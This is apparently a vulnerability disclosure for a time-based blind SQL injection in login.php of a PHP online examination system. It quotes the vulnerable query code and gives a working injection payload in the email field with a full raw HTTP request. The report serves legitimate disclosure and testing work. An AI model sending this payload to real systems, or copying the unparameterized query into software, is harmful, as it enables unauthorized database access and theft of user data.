# SQL Injection Vulnerability in `login.php` of the Online Examination System

The user login function of the Online Examination System is handled by `login.php`. The login form in `index.php:396` sends a `POST` request to `login.php?q=index.php`. In the backend code, `login.php:8` and `login.php:9` directly read the `email` and `password` parameters from user input, and `login.php:12` concatenates the `email` parameter into the SQL query:

```php
$email = $_POST['email'];
$password = $_POST['password'];

$password=md5($password); 
$result = mysqli_query($con,"SELECT name FROM user WHERE email = '$email' and password = '$password'") or die('Error');
```

Although the password is hashed with MD5 before the query is executed, the `email` parameter is not filtered or parameterized. As a result, an attacker can inject malicious SQL through `email`, causing a SQL injection vulnerability. Based on the provided request packet, this issue can be reproduced as a time-based blind SQL injection.

## Impact of the SQL Injection Vulnerability

An attacker can use this vulnerability to probe the database through the user login interface and confirm whether SQL injection is present. Once confirmed, the attacker may further attempt authentication bypass, extract sensitive data, enumerate tables and columns, or target user account information stored in the system. In practice, this can affect the confidentiality and integrity of exam-related user data.

## Payload

Injection parameter: `email`

Injected value:

```text
head@gmail.com'and(select*from(select+sleep(2))a/**/union/**/select+1)='
```

Request method: `POST`

Request path: `/login.php?q=index.php`

Raw request:

```http
POST /login.php?q=index.php HTTP/1.1
Host: project1
Content-Length: 92
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0
Origin: http://project1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://project1/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=2347fp9qoucglmem34csap1fbp
Connection: keep-alive

email=head@gmail.com'and(select*from(select+sleep(2))a/**/union/**/select+1)='&password=head
```

If the application response is delayed by about 2 seconds after sending the request, it indicates that the `email` parameter is likely vulnerable to time-based blind SQL injection.

## Sources Download

```
[Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)
```

[Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)



![image-20260604110941786](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260604110941786.png)
